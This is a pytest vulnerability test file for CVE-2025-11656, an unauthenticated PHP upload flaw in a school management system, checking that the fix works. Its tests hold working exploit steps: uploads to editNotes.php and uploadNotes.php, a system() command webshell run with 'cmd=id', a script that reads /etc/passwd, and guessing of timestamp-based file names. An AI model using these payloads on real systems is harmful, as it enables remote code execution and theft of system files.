#!/usr/bin/env python3
"""
Vulnerability tests for CVE-2025-11656.

These tests verify that the unrestricted file upload vulnerability has been fixed.
- FAIL in vulnerable state (vulnerability is exploitable)
- PASS in fixed state (vulnerability is mitigated)

The vulnerability allows unauthenticated users to upload arbitrary PHP files
to the /notesUploads/ directory, which can then be executed to achieve RCE.
"""
import pytest
import requests
import time
import random
import string

BASE_URL = "http://localhost:80/school-management-system"
TIMEOUT = 10


def generate_random_string(length=8):
    """Generate random string for unique filenames."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def check_file_uploaded_and_executable(unique_marker, base_url, extension=".php", timeout_range=5):
    """
    Check if a file with the unique marker was uploaded and is executable.
    Returns True if the file was uploaded and PHP code was executed.
    """
    current_time = int(time.time())

    for t in range(current_time - timeout_range, current_time + timeout_range):
        shell_url = f"{base_url}/notesUploads/{t}{extension}"
        try:
            r = requests.get(shell_url, timeout=5)
            # If we see the marker without PHP tags, the code was executed
            if unique_marker in r.text and "<?php" not in r.text:
                return True
        except:
            pass
    return False


class TestUnauthenticatedAccess:
    """Tests that verify unauthenticated access is blocked."""

    def test_unauthenticated_upload_rejected(self):
        """
        Test that unauthenticated file uploads are rejected.
        FAIL in vulnerable state: File gets uploaded and is accessible.
        PASS in fixed state: Request is rejected with "Unauthorized" message.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': ('test.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        response = requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        # Check if file was uploaded and executable (vulnerability exists)
        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        # In fixed state, the file should NOT be uploaded/executable
        assert not file_uploaded, \
            "Unauthenticated upload succeeded - vulnerability exists!"

    def test_no_session_access_blocked(self):
        """
        Test that requests without valid session are blocked.
        FAIL in vulnerable state: Files can still be uploaded without session.
        PASS in fixed state: Request is rejected properly.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': ('session_test.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        # Send request without any session cookie
        response = requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        # Check if file was uploaded despite no session
        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            "File uploaded without session - vulnerability exists!"


class TestPHPFileUploadBlocked:
    """Tests that verify PHP file uploads are blocked."""

    def test_php_extension_rejected(self):
        """
        Test that .php file uploads are rejected.
        FAIL in vulnerable state: PHP file is uploaded and accessible.
        PASS in fixed state: PHP file is blocked.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': (f'test_{unique_marker}.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            f"PHP file upload succeeded - vulnerability exists!"

    def test_php_upload_with_different_noteId(self):
        """
        Test PHP upload with different noteId values.
        FAIL in vulnerable state: PHP file is uploaded regardless of noteId.
        PASS in fixed state: PHP file is blocked.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': (f'test2.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '10',
            'subject': 'math',
            'title': 'exploit',
            'comment': 'exploit test',
            'noteId': '999'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            f"PHP file upload succeeded with different noteId - vulnerability exists!"

    def test_php_upload_minimal_params(self):
        """
        Test PHP upload with minimal required parameters.
        FAIL in vulnerable state: PHP file is uploaded.
        PASS in fixed state: PHP file is blocked.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': (f'minimal.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '1',
            'subject': 'x',
            'title': 'x',
            'comment': 'x',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            f"PHP file upload succeeded with minimal params - vulnerability exists!"


class TestWebshellUploadBlocked:
    """Tests that verify webshell uploads cannot achieve code execution."""

    def test_webshell_upload_and_execution_blocked(self):
        """
        Test that uploading a webshell and executing it is blocked.
        FAIL in vulnerable state: Webshell can be uploaded and executed.
        PASS in fixed state: Webshell cannot be uploaded or executed.
        """
        unique_marker = generate_random_string(16)

        webshell_content = f'<?php echo "{unique_marker}"; ?>'

        files = {
            'file': ('shell.php', webshell_content, 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        shell_executed = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not shell_executed, \
            "Webshell uploaded and executed - vulnerability exists!"

    def test_command_execution_webshell_blocked(self):
        """
        Test that a command execution webshell cannot be uploaded.
        FAIL in vulnerable state: Webshell can execute system commands.
        PASS in fixed state: Webshell cannot be uploaded.
        """
        webshell_content = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>'

        files = {
            'file': ('cmdshell.php', webshell_content, 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        current_time = int(time.time())
        command_executed = False

        for t in range(current_time - 5, current_time + 5):
            shell_url = f"{BASE_URL}/notesUploads/{t}.php"
            try:
                r = requests.get(f"{shell_url}?cmd=id", timeout=5)
                if "uid=" in r.text or "gid=" in r.text:
                    command_executed = True
                    break
            except:
                pass

        assert not command_executed, \
            "Command execution webshell works - vulnerability exists!"


class TestRemoteCodeExecution:
    """Tests that verify remote code execution is not possible."""

    def test_rce_via_file_read(self):
        """
        Test that uploaded PHP cannot read sensitive files.
        FAIL in vulnerable state: Can read /etc/passwd via uploaded shell.
        PASS in fixed state: Shell cannot be uploaded.
        """
        webshell_content = '<?php echo file_get_contents("/etc/passwd"); ?>'

        files = {
            'file': ('readfile.php', webshell_content, 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        current_time = int(time.time())
        file_read_success = False

        for t in range(current_time - 5, current_time + 5):
            shell_url = f"{BASE_URL}/notesUploads/{t}.php"
            try:
                r = requests.get(shell_url, timeout=5)
                if "root:" in r.text or "/bin/bash" in r.text:
                    file_read_success = True
                    break
            except:
                pass

        assert not file_read_success, \
            "File read via uploaded shell succeeded - vulnerability exists!"

    def test_rce_via_phpinfo(self):
        """
        Test that uploaded PHP cannot execute phpinfo().
        FAIL in vulnerable state: phpinfo() executes.
        PASS in fixed state: Shell cannot be uploaded.
        """
        unique_marker = generate_random_string(16)
        webshell_content = f'<?php phpinfo(); echo "{unique_marker}"; ?>'

        files = {
            'file': ('info.php', webshell_content, 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test',
            'noteId': '1'
        }

        requests.post(
            f"{BASE_URL}/assets/editNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        current_time = int(time.time())
        phpinfo_executed = False

        for t in range(current_time - 5, current_time + 5):
            shell_url = f"{BASE_URL}/notesUploads/{t}.php"
            try:
                r = requests.get(shell_url, timeout=5)
                if "PHP Version" in r.text or unique_marker in r.text:
                    phpinfo_executed = True
                    break
            except:
                pass

        assert not phpinfo_executed, \
            "phpinfo() executed via uploaded shell - vulnerability exists!"


class TestUploadNotesEndpoint:
    """Tests for the uploadNotes.php endpoint (similar vulnerability)."""

    def test_upload_notes_unauthenticated_blocked(self):
        """
        Test that unauthenticated access to uploadNotes.php is blocked.
        FAIL in vulnerable state: File can be uploaded via uploadNotes.php.
        PASS in fixed state: Upload is properly rejected.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': ('upload_test.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '12',
            'subject': 'test',
            'title': 'test',
            'comment': 'test'
        }

        requests.post(
            f"{BASE_URL}/assets/uploadNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        # Check if file was uploaded
        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            "uploadNotes.php allowed unauthenticated upload - vulnerability exists!"

    def test_upload_notes_php_blocked(self):
        """
        Test that PHP uploads via uploadNotes.php are blocked.
        FAIL in vulnerable state: PHP file is uploaded.
        PASS in fixed state: PHP file is rejected.
        """
        unique_marker = generate_random_string(16)

        files = {
            'file': ('shell2.php', f'<?php echo "{unique_marker}"; ?>', 'application/x-php')
        }
        data = {
            'class': '11',
            'subject': 'science',
            'title': 'test upload',
            'comment': 'testing'
        }

        requests.post(
            f"{BASE_URL}/assets/uploadNotes.php",
            files=files,
            data=data,
            timeout=TIMEOUT
        )

        file_uploaded = check_file_uploaded_and_executable(unique_marker, BASE_URL)

        assert not file_uploaded, \
            "uploadNotes.php allowed PHP upload - vulnerability exists!"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
